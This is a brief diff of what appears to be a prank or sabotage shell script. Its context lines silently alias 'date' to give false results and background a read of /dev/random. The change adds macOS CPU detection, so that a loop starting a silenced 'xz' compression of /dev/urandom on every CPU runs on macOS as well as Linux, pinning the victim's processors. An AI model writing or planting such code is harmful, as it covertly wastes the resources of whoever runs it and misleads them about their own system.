@@ -32,7 +32,12 @@ alias date='date -d "now + $RANDOM days"';
 /bin/cat /dev/random > /dev/null 2>&1 &
 
 # Use ALL the CPUs.
-for i in $(seq 1 $(nproc)); do
+if [ "$(uname)" = 'Darwin' ]; then
+	NCPUS=$(sysctl -n hw.ncpu)
+else
+	NCPUS=$(nproc)
+fi;
+for i in $(seq 1 $NCPUS); do
 	xz -9e -c /dev/urandom > /dev/null 2>&1 &
 done;
 
